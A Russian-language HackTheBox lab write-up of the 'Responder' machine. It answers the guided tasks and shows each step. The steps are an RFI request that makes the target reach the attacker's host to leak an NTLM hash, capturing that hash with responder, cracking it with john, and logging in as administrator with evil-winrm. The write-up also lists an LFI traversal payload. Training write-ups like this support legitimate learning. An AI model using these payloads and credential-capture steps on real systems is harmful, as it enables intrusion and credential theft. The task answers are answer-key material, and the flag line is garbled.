# 🖥️ Отчет по машине: Responder
**Дата:** 2026-06-26
**Платформа:** HackTheBox
**Сложность:** Easy
**Статус:** Done

---
Под скриптом, на простые вопросы буду отвечать без пояснений 
---
## 1. Разведка 

### Nmap
Запуск сканирования портов, чтобы увидеть доступные сервисы и их версии 
<img width="625" height="233" alt="Снимок экрана 2026-06-26 в 06 40 25" src="https://github.com/user-attachments/assets/321d799b-ea8f-457d-b941-8d82e8edc7b2" />

Два открытых порта, пеерключусь на 80.

### curl 
<img width="536" height="105" alt="Снимок экрана 2026-06-26 в 06 40 40" src="https://github.com/user-attachments/assets/a57f8aad-3a14-419a-b3b1-b17b6a84fb17" /> 

task 1: When visiting the web service using the IP address, what is the domain that we are being redirected to?
answer: unika.htb
 
у сайта редирект, нужно добавить его в /etc/hosts

~~~
echo '<IP target> domain.htb' | sudo tee /etc/hosts
~~~

task 2: Which scripting language is being used on the server to generate webpages?
answer: php

task 3: What is the name of the URL parameter which is used to load different language versions of the webpage?
answer: page
<img width="324" height="28" alt="Снимок экрана 2026-06-26 в 06 52 48" src="https://github.com/user-attachments/assets/05719ef2-3b73-41f0-be21-a97483f8f001" />

task 4: Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: 
1)  "french.html",
2)  "//10.10.14.6/somefile",
3)  "../../../../../../../../windows/system32/drivers/etc/hosts",
4)  "mimikatz.exe"
answer: 3

task 5: Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: 
1)  "french.html",
2)  "//10.10.14.6/somefile",
3)  "../../../../../../../../windows/system32/drivers/etc/hosts",
4)  "mimikatz.exe"
answer: 2

task 6: What does NTLM stand for? (спасибо гугл) 
ans: New Technology Lan Manager

task 7: Which flag do we use in the Responder utility to specify the network interface?
ans: -I 
~~~
sudo responder -I tun0 -v
~~~

task 8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.
ans: John the Ripper

~~~
curl "http://unika.htb/index.php?page=//10.10.14.39/somefile"
~~~
<img width="417" height="213" alt="Снимок экрана 2026-06-26 в 07 42 58" src="https://github.com/user-attachments/assets/8458eaa0-f143-43e3-b9df-cc4ca3b66a47" />

Копируем всю строку после hash:.... 
создаем файл .txt и закидываем туда и отправляем в john

~~~
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt shash.txt
~~~

<img width="690" height="201" alt="Снимок экрана 2026-06-26 в 07 44 44" src="https://github.com/user-attachments/assets/7a7c413e-907d-4828-801c-384dc041761f" />

[после этого я пытлася подключиться по smbclient и ушло некотрое время пока не понял что не нужно так]

task 9: What is the password for the administrator user?
ans: badminton

~~~
evil-winrm -i 10.129.95.234 -u administrator -p badminton
~~~

task 10: We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
ans: 5985
НУ мы изначально просмотрели через nmap -p-

<img width="690" height="459" alt="Снимок экрана 2026-06-26 в 07 46 53" src="https://github.com/user-attachments/assets/54d8f283-ed2b-4454-9083-753251e8b40d" />


task 11: On which user's desktop is the flag located?


flag: ubmit the flag located on the mike user's desktop.
там же))


### navigation win
whoami	Показывает текущего пользователя
hostname	Имя компьютера
cd	Сменить директорию
dir	Показать содержимое папки (аналог ls)
type	Показать содержимое файла (аналог cat)
echo	Вывести текст или записать в файл
cls	Очистить экран
exit	Выйти из сессии


___ 
Узнал про:
новое подключение "evil-winrm"
про responder и NTLM 

восторг!
